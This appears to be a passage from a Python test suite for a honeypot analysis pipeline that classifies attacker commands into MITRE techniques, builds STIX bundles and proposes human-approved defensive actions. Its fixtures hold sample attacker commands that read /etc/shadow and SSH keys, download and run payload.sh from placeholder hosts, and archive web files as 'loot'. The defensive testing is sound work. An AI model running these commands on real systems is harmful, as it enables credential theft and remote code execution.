        "src_ip": "198.51.100.9",
        "sensor": "unit-sensor",
        "start_time": "2026-06-10T01:00:00Z",
        "end_time": "2026-06-10T01:05:00Z",
        "commands": ["cat /etc/passwd", "wget http://example.com/payload.sh -O /tmp/p.sh"],
        "ttps": ["T1003", "T1105"],
        "ioc_summary": report["ioc_summary"],
        "campaign_summary": {
            "campaign_id": "campaign-unit",
            "matched_existing_campaign": True,
            "campaign_session_count": 2,
            "max_confirmed_severity": "high",
        },
    }

    bundle = build_stix_bundle(report, session_payload)
    assert validate_stix_bundle_document(bundle) == []
    objects = bundle["objects"]
    types = {item["type"] for item in objects}
    assert {"course-of-action", "observed-data", "sighting", "campaign", "identity", "x-honeypot-command-sequence"}.issubset(types)
    course = next(item for item in objects if item["type"] == "course-of-action")
    assert course["x_honeypot_authority"] == "trusted_policy_engine"
    assert course["x_honeypot_requires_manual_approval"] is True
    assert course["x_honeypot_safe_to_auto_execute"] is False
    assert any(item["type"] == "relationship" and item["relationship_type"] == "mitigates" for item in objects)
    observed = next(item for item in objects if item["type"] == "observed-data")
    assert "cat /etc/passwd" in observed["x_honeypot_commands"]
    assert observed["object_refs"]
    campaign = next(item for item in objects if item["type"] == "campaign")
    assert campaign["x_honeypot_campaign_id"] == "campaign-unit"
    assert "not confirmed named-actor attribution" in campaign["description"]
    report_obj = next(item for item in objects if item["type"] == "report")
    assert course["id"] in report_obj["object_refs"]
    assert observed["id"] in report_obj["object_refs"]


def test_stix_bundle_rejects_untrusted_ai_recommendations_as_courses_of_action() -> None:
    report = {
        "session_id": "stix-untrusted",
        "summary": "Observed discovery only.",
        "recommended_actions_structured": [
            {
                "action_id": "ai-delete-host",
                "action": "Delete the host.",
                "approved_by_policy": False,
                "authority": "ai_generated",
                "references": [],
            }
        ],
        "recommendation_provenance": {"authority": "ai_generated"},
    }
    session_payload = {
        "session_id": "stix-untrusted",
        "src_ip": "203.0.113.5",
        "commands": ["whoami"],
        "ttps": ["T1033"],
    }
    bundle = build_stix_bundle(report, session_payload)
    assert not any(item["type"] == "course-of-action" for item in bundle["objects"])
    assert validate_stix_bundle_document(bundle) == []


def test_stix_bundle_validator_rejects_unsafe_course_of_action() -> None:
    bundle = {
        "type": "bundle",
        "id": "bundle--11111111-1111-4111-8111-111111111111",
        "objects": [
            {
                "type": "report",
                "spec_version": "2.1",
                "id": "report--22222222-2222-4222-8222-222222222222",
                "name": "Unit",
                "object_refs": ["course-of-action--33333333-3333-4333-8333-333333333333"],
            },
            {
                "type": "course-of-action",
                "spec_version": "2.1",
                "id": "course-of-action--33333333-3333-4333-8333-333333333333",
                "name": "AI invented action",
                "x_honeypot_authority": "ai_generated",
                "x_honeypot_requires_manual_approval": True,
                "x_honeypot_safe_to_auto_execute": False,
            },
        ],
    }
    errors = validate_stix_bundle_document(bundle)
    assert any("trusted_policy_engine-authorized" in error for error in errors)


def test_stix_external_validator_skips_when_optional_dependency_missing() -> None:
    result = run_external_stix_validation(
        "unused.json",
        module_name="definitely_missing_stix_validator_package",
    )
    assert result["available"] is False
    assert result["status"] == "skipped"
    assert result["errors"] == []


def test_stix_external_validator_required_fails_when_dependency_missing() -> None:
    result = run_external_stix_validation(
        "unused.json",
        required=True,
        module_name="definitely_missing_stix_validator_package",
    )
    assert result["available"] is False
    assert result["status"] == "failed"
    assert result["errors"]


def test_ai_report_deterministic_summary_is_evidence_only() -> None:
    class Url:
        value = "http://example.com/payload.sh"

    class Bundle:
        urls = [Url()]

    summary = _build_deterministic_executive_summary(
        ["198.51.100.45"],
        {"discovery": ["T1033"], "command-and-control": ["T1105"]},
        {"T1033": ["whoami"], "T1105": ["wget http://example.com/payload.sh -O /tmp/p.sh"]},
        _derive_primary_objective(
            "Under analysis",
            {"discovery": ["T1033"], "command-and-control": ["T1105"]},
            {"T1033": ["whoami"], "T1105": ["wget http://example.com/payload.sh -O /tmp/p.sh"]},
        ),
        Bundle(),
    )
    assert "198.51.100.45" in summary
    assert "`whoami`" in summary
    assert "not treated as confirmed C2 or exfiltration" in summary


def test_monitor_report_panel_shows_ai_validation_warnings_and_clear_follow_on_label() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        report_path = Path(tmp) / "sess-report_report.json"
        report_path.write_text(
            json.dumps(
                {
                    "session_id": "sess-report",
                    "campaign_name": "Unit Report",
                    "executive_summary": "Observed source IP 8.8.8.8 ran `whoami`.",
                    "ai_validation_warnings": [
                        {
                            "field": "executive_summary",
                            "reason": "AI field referenced evidence outside direct session observations",
                            "dropped_unobserved_commands": ["ifconfig"],
                        }
                    ],
                    "threat_hypothesis": {
                        "post_session_follow_on_hypothesis": "Possible payload staging if activity continues.",
                        "predicted_next_action": "Possible payload staging if activity continues.",
                    },
                }
            ),
            encoding="utf-8",
        )
        selected = {
            "analysis_status": "succeeded",
            "updated_at": "2026-06-01T00:00:00Z",
            "report_row": {
                "payload_json": json.dumps(
                    {
                        "session_id": "sess-report",
                        "artifacts": {"json": str(report_path)},
                    }
                )
            },
            "job": {"status": "succeeded", "report_id": "report-unit"},
        }
        html = _render_report_panel(selected, tmp)
        assert "post_session_follow_on_hypothesis" in html
        assert "AI validation guardrail activated" in html
        assert "ifconfig" in html


def test_monitor_renders_realtime_prediction_snapshot() -> None:
    html = _render_prediction_panel(
        {
            "ok": True,
            "latest_prediction_snapshot": {
                "snapshot_id": "predsnap-test",
                "payload": {
                    "snapshot_id": "predsnap-test",
                    "generated_at": "2026-05-13T10:00:00+00:00",
                    "engine": {"name": "realtime_prediction", "version": "1.0"},
                    "session_status": "active",
                    "event_id": "evt-test",
                    "prediction_trigger": {
                        "eventid": "cowrie.command.input",
                        "reason": "eventid matched prediction trigger prefix: cowrie.command.",
                    },
                    "features_hash": "features-test",
                    "weights": {"local_transition": 0.35, "fallback_progression": 0.35},
                    "active_weights": {"local_transition": 1.0},
                    "coverage": {"active_scorer_count": 1, "min_active_scorers": 2, "below_minimum": True, "reason": "insufficient scorer coverage"},
                    "confidence_damping": {"mode": "geometric_mean", "factor": 1.0},
                    "model_maturity": {
                        "maturity": "cold",
                        "local_transition_sessions": 12,
                        "local_transition_transitions": 9,
                        "prior_dominated": True,
                        "warning": "Prediction is prior-dominated; treat confidence as low.",
                    },
                    "local_transition_model": {
                        "source_type": "empirical_local",
                        "source_database": "sqlite:///unit.db",
                        "model_id": "transitionmodel-test",
                        "recency_decay_half_life_sessions": 500,
                    },
                    "external_seed_model": {
                        "enabled": True,
                        "usable_sessions": 52011,
                        "transition_count": 3782,
                        "dataset_handle": "unit-test/cowrie-seed",
                        "model_id": "externaltransition-test",
                        "warning": "External Cowrie seed transition model is active; treat it as external prior.",
                    },
                    "features": {
                        "commands": ["whoami", "cat /etc/passwd"],
                        "observed_tactics": ["discovery", "credential-access"],
                        "last_tactic": "credential-access",
                        "classification_chain_confidence_geomean": 1.0,
                        "classification_events": [
                            {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0}
                        ],
                    },
                    "classification_quality": {
                        "validation_status": "unvalidated",
                        "source_counts": {"rule": 1},
                        "unknown_count": 0,
                        "shell_noise_count": 0,
                        "confidence_min": 1.0,
                        "confidence_geomean": 1.0,
                    },
                    "calibration_status": {"status": "disabled", "ready_bin_count": 0, "bin_count": 0},
                    "trust_status": {
                        "status": "review_required",
                        "evidence_posture": "local_supported",
                        "dominant_source": "local_transition",
                        "warnings": ["Classification validation baseline is not available yet."],
                    },
                    "final_ranking": [
                        {
                            "tactic": "command-and-control",
                            "confidence": "medium",
                            "score": 0.52,
                            "sources": [{"name": "local_transition", "version": "1.0", "source_type": "empirical_local", "weighted_score": 0.35}],
                            "reasons": ["local history observed 2/3 completed transitions from credential-access to command-and-control"],
                        }
                    ],
                    "scorer_outputs": {
                        "local_transition": [
                            {
                                "tactic": "command-and-control",
                                "score": 0.667,
                                "reasons": ["local history observed 2/3 completed transitions"],
                            }
                        ],
                        "fallback_progression": [],
                    },
                },
            },
        }
    )
    assert "Ranked Next-Step Hypotheses" in html
    assert "command-and-control" in html
    assert "local_transition" in html
    assert "empirical_local" in html
    assert "current prediction" in html
    assert "trigger_eventid" in html
    assert "insufficient scorer coverage" in html
    assert "external_seed_sessions" in html
    assert "unit-test/cowrie-seed" in html
    assert "local history observed 2/3 completed transitions" in html
    assert "local_transition=0.35" in html
    assert "Why This Prediction?" in html
    assert "classification_validation" in html
    assert "transitionmodel-test" in html
    assert "whoami" in html


def test_monitor_renders_observable_sightings_and_related_sessions() -> None:
    html = _render_observable_sightings(
        {
            "ok": True,
            "observable_sightings": [
                {
                    "timestamp": "2026-05-13T10:00:00Z",
                    "observable_type": "url",
                    "observable_value": "http://evil.example.com/payload.sh",
                    "role": "command_url",
                    "source": "cowrie_event",
                    "eventid": "cowrie.command.input",
                    "payload": {"metadata": {"domain": "evil.example.com"}},
                }
            ],
            "related_observable_sightings": [
                {
                    "observable_type": "url",
                    "observable_value": "http://evil.example.com/payload.sh",
                    "session_id": "other-session",
                }
            ],
            "errors": {},
        }
    )
    assert "Observable Sightings" not in html
    assert "http://evil.example.com/payload.sh" in html
    assert "command_url" in html
    assert "Related Sessions Sharing These Observables" in html
    assert "other-session" in html


def test_monitor_renders_cross_session_threat_hunt_links_and_jobs() -> None:
    html = _render_cross_session_hunting(
        {
            "ok": True,
            "session_id": "source-closed",
            "session_links": [
                {
                    "created_at": "2026-05-13T10:00:00Z",
                    "session_id_a": "source-closed",
                    "session_id_b": "related-active",
                    "link_type": "shared_observable",
                    "observable_type": "url",
                    "observable_value": "http://evil.example.com/payload.sh",
                    "confidence": 0.9,
                    "payload": {"related_roles": ["command_url"]},
                }
            ],
            "threat_hunt_jobs": [
                {
                    "status": "succeeded",
                    "observable_type": "url",
                    "observable_value": "http://evil.example.com/payload.sh",
                    "attempts": 1,
                    "updated_at": "2026-05-13T10:00:01Z",
                    "result": {"related_session_count": 1, "links_created": 1, "alerts_created": 1},
                }
            ],
            "errors": {},
        }
    )
    assert "Session Links" in html
    assert "related-active" in html
    assert "http://evil.example.com/payload.sh" in html
    assert "Threat Hunt Jobs From This Session" in html
    assert "succeeded" in html


def test_monitor_renders_inline_enrichment_values() -> None:
    html = _render_enrichment_findings(
        [
            {
                "observable_type": "ip",
                "observable_value": "198.51.100.45",
                "provider_status": {
                    "censys": {"status": "ok"},
                    "shodan": {"status": "ok"},
                },
                "payload": {
                    "country": "DE",
                    "asn": 60729,
                    "isp": "TORSERVERS-NET",
                    "risk_score": 100,
                    "vt_detection_ratio": "20/92",
                    "open_ports": [80, 10045],
                    "running_services": ["HTTP 80/tcp"],
                    "censys_api": "platform",
                    "censys_labels": ["PROXY_SERVER"],
                    "shodan_api": "internetdb",
                    "shodan_hostnames": ["tor-exit-45.for-privacy.net"],
                },
            }
        ]
    )
    assert "Fetched Enrichment Values" not in html
    assert "censys:ok" in html
    assert "country=DE" in html
    assert "risk_score=100" in html
    assert "open_ports=80, 10045" in html
    assert "censys_api=platform" in html
    assert "shodan_hostnames=tor-exit-45.for-privacy.net" in html


def test_smb_decision_uses_trusted_policy_and_asset_context() -> None:
    session_payload = {
        "session_id": "smb-1",
        "src_ip": "198.51.100.45",
        "sensor": "demo-sensor",
        "protocol": "ssh",
        "dst_port": 22,
        "login_success": True,
        "commands": [
            "whoami",
            "cat /home/exampleuser/.ssh/id_rsa",
            "wget http://example.com/payload.sh -O /tmp/p.sh",
        ],
        "tactics": ["discovery", "credential-access", "command-and-control"],
        "ttps": ["T1033", "T1552", "T1105"],
        "classification_events": [
            {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0},
            {"command": "cat /home/exampleuser/.ssh/id_rsa", "ttp": "T1552", "tactic": "credential-access", "source": "rule", "confidence": 1.0},
            {"command": "wget http://example.com/payload.sh -O /tmp/p.sh", "ttp": "T1105", "tactic": "command-and-control", "source": "rule", "confidence": 1.0},
        ],
    }
    prediction_snapshot = {
        "final_ranking": [
            {
                "tactic": "lateral-movement",
                "confidence": "medium",
                "score": 0.66,
                "reasons": ["credential access can enable account reuse"],
            }
        ],
        "classification_quality": {"confidence_geomean": 1.0},
        "trust_status": {"local_model_maturity": "warming"},
    }
    asset_profile = {
        "schema_version": "smb_asset_profile.v1",
        "profile_id": "test-profile",
        "assets": [
            {
                "asset_id": "ssh-admin",
                "display_name": "Public SSH admin service",
                "service_category": "remote_access",
                "protocols": ["ssh"],
                "ports": [22],
                "internet_exposed": True,
                "criticality": "high",
            }
        ],
    }
    action_policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
    decision = build_smb_decision(
        session_payload=session_payload,
        prediction_snapshot=prediction_snapshot,
        asset_profile=asset_profile,
        action_policy=action_policy,
    )
    assert decision["mode"] == "smb_proactive_threat_intelligence"
    assert decision["risk"]["severity"] == "high"
    assert "Possible credential-related discovery" in decision["likely_goal"]["likely_goal"]
    assert decision["asset_context"]["matched_assets"][0]["asset_id"] == "ssh-admin"
    actions = [item["action"] for item in decision["immediate_actions"]]
    assert any("rotate only credentials confirmed exposed or reused" in action for action in actions)
    assert any("temporary rate limiting or blocking only when" in action for action in actions)
    refs = decision["immediate_actions"][0]["references"]
    assert refs and refs[0].get("url", "").startswith("https://")
    assert not decision["rejected_actions"]
    for item in decision["immediate_actions"]:
        assert item["authority"] == "trusted_policy_engine"
        assert item["approved_by_policy"] is True
        assert item["provenance"]["authority"] == "trusted_policy_engine"
        assert item["provenance"]["policy"]["policy_id"] == "smb-proactive-cti-playbooks"
        assert item["provenance"]["rule"]["reviewed"] is True
        assert item["provenance"]["action_template"]["reviewed"] is True
        assert item.get("severity") in {"info", "low", "medium", "high", "critical"}
        assert item.get("confidence") in {"low", "possible", "medium", "likely", "high"}
        assert item.get("evidence")
        assert item.get("evidence_refs")
        assert item.get("visibility_limitations")
        assert item.get("references")
        assert item["automation_safety"]["requires_manual_approval"] is True
        assert item["requires_manual_approval"] is True


def test_smb_recommendations_distinguish_attempt_transfer_and_execution_evidence() -> None:
    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
    profile = {"schema_version": "smb_asset_profile.v1", "assets": []}
    transfer_event = {
        "command": "curl https://example.invalid/a.sh -o /tmp/a.sh",
        "ttp": "T1105",
        "tactic": "command-and-control",
        "source": "rule",
        "confidence": 1.0,
        "high_confidence": True,
        "evidence_id": "transfer-classification",
        "command_outcome": "outcome_unknown",
        "event_timestamp": "2026-07-16T00:00:01Z",
        "cowrie_eventid": "cowrie.command.input",
    }
    payload = {
        "session_id": "recommendation-transfer-attempt",
        "src_ip": "192.0.2.10",
        "protocol": "ssh",
        "dst_port": 22,
        "commands": [transfer_event["command"]],
        "classification_events": [transfer_event],
        "raw_events": [],
    }

    attempted = build_smb_decision(payload, asset_profile=profile, action_policy=policy)
    attempt_ids = {item["action_id"] for item in attempted["immediate_actions"]}
    assert attempted["risk"]["severity"] == "medium"
    assert attempted["evidence"]["canonical_summary"]["confirmed_cowrie_transfer"] is False
    assert "block-download-iocs" in attempt_ids
    assert "hunt-cowrie-confirmed-artifact" not in attempt_ids
    assert all(item["evidence_refs"] for item in attempted["immediate_actions"])
    assert all(item["visibility_limitations"] for item in attempted["immediate_actions"])
    assert not any("completed download" in item["why"].lower() for item in attempted["immediate_actions"])

    confirmed_payload = copy.deepcopy(payload)
    confirmed_payload["session_id"] = "recommendation-confirmed-transfer"
    confirmed_payload["raw_events"] = [{
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-07-16T00:00:02Z",
        "outfile": "/tmp/a.sh",
        "shasum": "a" * 64,
        "url": "https://example.invalid/a.sh",
    }]
    confirmed = build_smb_decision(confirmed_payload, asset_profile=profile, action_policy=policy)
    confirmed_ids = {item["action_id"] for item in confirmed["immediate_actions"]}
    assert confirmed["risk"]["severity"] == "high"
    assert confirmed["evidence"]["canonical_summary"]["confirmed_cowrie_transfer"] is True
    assert "hunt-cowrie-confirmed-artifact" in confirmed_ids
    assert "block-download-iocs" not in confirmed_ids
    assert not any("execution" in item["action"].lower() for item in confirmed["immediate_actions"])

    execution_payload = copy.deepcopy(payload)
    execution_payload["session_id"] = "recommendation-execution-attempt"
    execution_payload["commands"].append("sh /tmp/a.sh")
    execution_payload["classification_events"].append({
        "command": "sh /tmp/a.sh",
        "ttp": "T1059",
        "tactic": "execution",
        "source": "rule",
        "confidence": 1.0,
        "high_confidence": True,
        "evidence_id": "execution-classification",
        "command_outcome": "outcome_unknown",
        "event_timestamp": "2026-07-16T00:00:03Z",
        "cowrie_eventid": "cowrie.command.input",
    })
    execution = build_smb_decision(execution_payload, asset_profile=profile, action_policy=policy)
    execution_action = next(
        item for item in execution["immediate_actions"]
        if item["action_id"] == "correlate-execution-attempt"
    )
    assert "outcome" in execution_action["why"].lower()
    report = build_v2_report({
        "recommended_actions_structured": execution["immediate_actions"],
        "trusted_recommendation_decision": execution,
    }, [execution_payload])
    assert report["recommendations"]["operator_actions"]
    assert all(
        item["grounding_status"] == "canonical_observed_evidence"
        for item in report["recommendations"]["operator_actions"]
    )


def test_smb_discovery_and_audit_only_sessions_remain_conservative() -> None:
    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
    profile = json.loads((ROOT / "configs" / "smb_asset_profile.example.json").read_text(encoding="utf-8"))
    discovery = build_smb_decision(
        {
            "session_id": "recommendation-discovery",
            "src_ip": "192.0.2.11",
            "protocol": "ssh",
            "dst_port": 22,
            "commands": ["whoami"],
            "classification_events": [{
                "command": "whoami",
                "ttp": "T1033",
                "tactic": "discovery",
                "source": "rule",
                "confidence": 1.0,
                "evidence_id": "discovery-evidence",
            }],
        },
        asset_profile=profile,
        action_policy=policy,
    )
    actions = discovery["immediate_actions"]
    assert discovery["risk"]["severity"] == "low"
    assert not any("rotate" in item["action"].lower() for item in actions)
    assert not any(item["action"].startswith("Block ") for item in actions)

    audit_only = build_smb_decision(
        {
            "session_id": "recommendation-audit-only",
            "src_ip": "192.0.2.12",
            "protocol": "ssh",
            "dst_port": 22,
            "commands": ["printf opaque"],
            "classification_events": [{
                "command": "printf opaque",
                "ttp": "T1562",
                "tactic": "defense-evasion",
                "source": "securebert_low_confidence",
                "confidence": 0.2,
                "high_confidence": False,
                "evidence_id": "audit-only-evidence",
            }],
        },
        asset_profile=profile,
        action_policy=policy,
    )
    assert "defense-evasion" not in audit_only["evidence"]["observed_tactics"]
    assert not any(
        item["rule_id"] == "defense-evasion-response"
        for item in audit_only["immediate_actions"]
    )


def test_smb_action_policy_requires_trusted_references() -> None:
    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
    profile = json.loads((ROOT / "configs" / "smb_asset_profile.example.json").read_text(encoding="utf-8"))
    assert validate_action_policy(policy) == []
    assert validate_asset_profile(profile) == []
    broken = dict(policy)
    broken["risk_rules"] = [
        {
            "rule_id": "bad-rule",
            "enabled": True,
            "source_type": "trusted_control_guidance",
            "applies_when": {"any_tactics": ["credential-access"]},
            "severity": "high",
            "reason": "missing source references",
        }
    ]
    assert any("missing references" in error for error in validate_action_policy(broken))


def test_smb_action_policy_requires_reviewed_provenance() -> None:
    policy = json.loads((ROOT / "configs" / "smb_action_playbooks.trusted.json").read_text(encoding="utf-8"))
    assert validate_action_policy(policy) == []

    missing_rule_provenance = json.loads(json.dumps(policy))
    missing_rule_provenance["risk_rules"][0].pop("provenance", None)
    assert any("provenance is required" in error for error in validate_action_policy(missing_rule_provenance))

    unreviewed_action = json.loads(json.dumps(policy))
    unreviewed_action["action_playbooks"][0]["actions"][0]["provenance"]["reviewed"] = False
    assert any("provenance.reviewed must be true" in error for error in validate_action_policy(unreviewed_action))

    generated_unreviewed_playbook = json.loads(json.dumps(policy))
    provenance = generated_unreviewed_playbook["action_playbooks"][0]["provenance"]
    provenance["generated"] = True
    provenance["reviewed"] = False
    errors = validate_action_policy(generated_unreviewed_playbook)
    assert any("generated operator-action policy must be reviewed before use" in error for error in errors)


def test_smb_decision_adds_mitre_reference_guidance_without_policy_authority() -> None:
    class FakeMitre:
        def get_name(self, tid):
            return {"T1082": "System Information Discovery"}.get(tid, tid)

        def get_mitigations(self, tid):
            return ["Audit", "Operating System Configuration"] if tid == "T1082" else []

    decision = build_smb_decision(
        session_payload={
            "session_id": "mitre-ref-session",
            "src_ip": "203.0.113.10",
            "commands": ["uname -a"],
            "tactics": ["discovery"],
            "ttps": ["T1082"],
        },
        asset_profile={"schema_version": "smb_asset_profile.v1", "assets": []},
        action_policy={
            "schema_version": "smb_action_policy.v1",
            "trusted_sources": {},
            "action_playbooks": [],
        },
        mitre_db=FakeMitre(),
    )
    guidance = decision.get("reference_guidance") or []
    assert guidance
    assert guidance[0]["technique"] == "T1082"
    assert guidance[0]["authority"] == "trusted_external_reference"
    assert guidance[0]["approved_by_policy"] is False
    assert guidance[0]["requires_manual_approval"] is True
    assert "MITRE" in guidance[0]["references"][0]["name"]


def test_report_completed_actions_are_policy_ordered_not_ttp_allowlist() -> None:
    completed = _completed_actions_from_observed_ttps(
        {
            "discovery": ["T1082"],
            "command-and-control": ["T1105"],
            "collection": ["T1560"],
        },
        {
            "T1082": ["uname -a"],
            "T1105": ["wget http://example.com/a.sh"],
            "T1560": ["tar -czf loot.tgz /var/www"],
        },
    )
    assert "wget http://example.com/a.sh" in completed
    assert "uname -a" in completed
    assert "tar -czf loot.tgz /var/www" in completed


def test_coverage_audit_reports_mapping_surfaces() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        mitre_cache = Path(tmp) / "mitre.json"
        mitre_cache.write_text(
            json.dumps(
                {
                    "techniques": {
                        "T1033": {"name": "System Owner/User Discovery", "tactics": ["Discovery"]},
                        "T1082": {"name": "System Information Discovery", "tactics": ["Discovery"]},
                        "T1105": {"name": "Ingress Tool Transfer", "tactics": ["Command And Control"]},
                    }
                }
            ),
            encoding="utf-8",
        )
        cfg = ProductionConfig(
            mitre_attack_path=str(mitre_cache),
            enable_securebert=False,
            session_ttp_correlation_policy_path=str(ROOT / "configs" / "session_ttp_correlation.trusted.json"),
            smb_action_policy_path=str(ROOT / "configs" / "smb_action_playbooks.trusted.json"),
            prediction_policy_path=str(ROOT / "configs" / "prediction_policy.trusted.json"),
        )
        cfg.prediction_policy = {}
        audit = build_coverage_audit(cfg)
    assert audit["schema_version"] == "coverage_audit.v1"
    names = {item["name"] for item in audit["coverage"]}
    assert "classification_policy_rules" in names
    assert "session_ttp_correlation_active_policy_and_packs" in names
    assert any(surface["symbol"] == "EMERGENCY_RULE_SPECS" for surface in audit["hardcoded_surfaces"])


def test_classification_rule_policy_validates_and_loads_command_rules() -> None:
    policy = json.loads((ROOT / "configs" / "classification_rules.trusted.json").read_text(encoding="utf-8"))
    assert validate_classification_rule_policy(policy) == []
    classifier = NotebookParityClassifier(rule_policy_path=str(ROOT / "configs" / "classification_rules.trusted.json"))
    assert classifier.classify("cat /etc/shadow")[0]["ttp"] == "T1003"
    assert classifier.classify("wget http://example.com/a.sh -O /tmp/a")[0]["ttp"] == "T1105"
    broken = dict(policy)
    broken["policy"] = {"rules": [dict((policy["policy"]["rules"])[0], references=[])]}
    assert any("missing references" in error for error in validate_classification_rule_policy(broken))

    bad_review_mode = json.loads(json.dumps(policy))
    bad_review_mode["policy"]["rule_review_mode"] = "trust_everything"
    assert any("unsupported rule_review_mode" in error for error in validate_classification_rule_policy(bad_review_mode))

    missing_review_metadata = json.loads(json.dumps(policy))
    reviewed_rule = next(
        rule
        for rule in missing_review_metadata["policy"]["rules"]
        if (rule.get("provenance") or {}).get("reviewed") is True
    )
    reviewed_rule["provenance"].pop("reviewer", None)
    reviewed_rule["provenance"].pop("last_reviewed", None)
    reviewed_rule["provenance"].pop("review_status", None)
    errors = validate_classification_rule_policy(missing_review_metadata)
    assert any("reviewed rules must include reviewer" in error for error in errors)
    assert any("reviewed rules must include last_reviewed" in error for error in errors)
    assert any("reviewed rules must include review_status" in error for error in errors)

    bare_sentinel = "classification-regex-bare-secret-896b"
    invalid_regex = json.loads(json.dumps(policy))
    invalid_regex["policy"]["rules"][0]["pattern"] = f"(?P<{bare_sentinel}>"
    regex_errors = validate_classification_rule_policy(invalid_regex)
    assert any("invalid regex" in error for error in regex_errors)
    assert bare_sentinel not in json.dumps(regex_errors)


def test_session_ttp_policy_regex_errors_do_not_echo_pattern_text() -> None:
    bare_sentinel = "correlation-regex-bare-secret-639d"
    policy = load_session_ttp_correlation_policy(
        Path("configs") / "session_ttp_correlation.trusted.json"
    )
    policy = json.loads(json.dumps(policy))
    policy["policy"]["rules"][0]["conditions"]["any"] = [
        {"type": "command_regex", "pattern": f"(?P<{bare_sentinel}>"}
    ]

    errors = validate_session_ttp_correlation_policy(policy)

    assert any("invalid regex" in error for error in errors)
    assert bare_sentinel not in json.dumps(errors)


if __name__ == "__main__":
    test_ingest_validation_and_parsing()
    test_notebook_classifier_rule_merge_and_noise_filter()
    test_compound_command_is_split_and_classified_in_order()
    test_demo_sensitive_key_and_chmod_use_reviewed_policy_rules()
    test_honeypot_command_rule_policy_covers_common_attack_observables()
    test_session_ttp_correlation_policy_validates_and_correlates_session_patterns()
    test_session_ttp_correlation_covers_common_honeypot_attack_chains()
    test_session_evidence_graph_builds_ordered_sequences_without_secrets()
    test_session_ttp_knowledge_pack_combines_with_policy_and_preserves_provenance()
    test_session_ttp_knowledge_pack_generates_sigma_candidate_rules()
    test_session_ttp_knowledge_pack_generates_mitre_command_rules()
    test_generated_session_ttp_pack_loads_as_external_candidate_coverage()
    test_unreviewed_generated_session_ttp_rule_cannot_influence_prediction()
    test_session_ttp_knowledge_pack_generates_external_seed_sequence_rules()
    test_session_ttp_knowledge_pack_generates_car_candidate_rules()
    test_session_ttp_correlation_validation_rejects_missing_provenance()
    test_session_worker_persists_session_ttp_correlations_in_features()
    test_realtime_prediction_builds_features_and_ranked_snapshot()
    test_behavior_regime_metadata_flags_rapid_scripted_sessions_without_affecting_weights()
    test_behavior_regime_metadata_keeps_spaced_exploratory_sessions_low_automation()
    test_realtime_prediction_dampens_weak_classification_confidence()
    test_realtime_prediction_model_maturity_caps_cold_confidence()
    test_realtime_prediction_applies_empirical_calibration_bins()
    test_realtime_prediction_records_scorer_disagreement()
    test_realtime_prediction_caps_external_seed_only_confidence()
    test_realtime_prediction_caps_enrichment_only_confidence()
    test_realtime_prediction_enrichment_modes_are_explicit()
    test_realtime_prediction_deduplicates_correlated_rule_priors_by_evidence_key()
    test_realtime_prediction_disagreement_penalty_keeps_top3_available()
    test_prediction_policy_file_loads_versioned_rules()
    test_trusted_policy_uses_honest_provenance_labels()
    test_prediction_policy_validation_blocks_missing_provenance()
    test_trusted_source_and_enrichment_scorers_are_provenance_labeled()
    test_technique_to_tactic_aggregation_methods_show_sum_bias()
    test_sigma_correlation_aggregates_techniques_to_tactics_by_policy()
    test_vulnerability_risk_scorer_uses_cve_kev_epss_context()
    test_local_transition_scorer_learns_from_completed_sessions()
    test_local_transition_scorer_prefers_sequence_prefixes()
    test_primary_transition_mode_prefers_transition_frequency_by_default()
    test_primary_transition_mode_uses_fallback_for_unseen_context()
    test_weighted_ensemble_is_not_default_prediction_mode()
    test_weighted_ensemble_baseline_mode_remains_available()
    test_local_transition_model_recency_decay_and_min_support()
    test_external_seed_transition_model_is_separate_from_local_maturity()
    test_external_seed_weight_decays_as_local_model_matures()
    test_external_seed_decay_can_use_empirical_shrinkage()
    test_external_seed_empirical_shrinkage_boundary_behavior()
    test_session_features_include_actor_fingerprint_context()
    test_actor_fingerprint_transition_scorer_uses_matching_fingerprint_history()
    test_actor_fingerprint_transition_scorer_is_inactive_without_matching_fingerprint()
    test_external_seed_health_summarizes_quality_and_validation()
    test_external_seed_builder_uses_securebert_rules_and_quality_filters()
    test_external_seed_builder_accepts_rule_securebert_tactic_agreement()
    test_prediction_backtest_scores_next_tactic_accuracy()
    test_prediction_backtest_reports_baseline_and_ablation_modes()
    test_external_seed_shrinkage_grid_search_marks_empty_metrics_missing()
    test_external_seed_shrinkage_grid_search_selects_lowest_brier_fixture()
    test_empirical_weight_fit_excludes_context_and_risk_by_default()
    test_prediction_backtest_reports_proposal_only_empirical_weight_fit()
    test_prediction_backtest_splits_live_and_controlled_metrics()
    test_prediction_backtest_loads_external_seed_model()
    test_ioc_extraction_matches_notebook_honeypot_behavior()
    test_runtime_context_builds_bpg_and_ioc_summary()
    test_observable_sighting_extraction_records_ip_url_domain_and_hash()
    test_threat_hunt_worker_links_related_sessions_and_alerts_active_match()
    test_session_worker_enqueues_threat_hunt_jobs_on_session_close()
    test_threat_hunt_worker_backfills_existing_closed_sessions()
    test_campaign_clustering_builds_stable_behavior_fingerprint()
    test_campaign_clustering_links_returning_actor_and_alerts_high_severity()
    test_session_worker_stores_campaign_summary_on_closed_session()
    test_monitor_renders_campaign_panel()
    test_session_close_creates_exactly_one_analysis_job_and_redacts_credentials()
    test_session_worker_skips_prediction_for_non_behavior_events()
    test_session_worker_can_disable_prediction_trigger_filter()
    test_session_worker_uses_local_transition_history_when_available()
    test_session_worker_stores_smb_decision_and_high_risk_alert()
    test_predictive_alert_policy_creates_alert_for_high_risk_prediction()
    test_predictive_alert_policy_keeps_risk_annotation_informational_by_default()
    test_predictive_alert_policy_suppresses_closed_session_prediction()
    test_predictive_alert_policy_suppresses_weakly_supported_high_risk_prediction()
    test_predictive_alert_policy_suppresses_high_divergence()
    test_session_worker_suppresses_prediction_only_alert_and_enrichment()
    test_session_worker_discards_forged_prediction_alert_payload()
    test_storage_returns_latest_prediction_snapshot_for_session()
    test_dashboard_current_prediction_payload_includes_trust_summary()
    test_storage_records_backtest_runs_and_analyst_feedback()
    test_calibration_worker_generates_bounded_overlay()
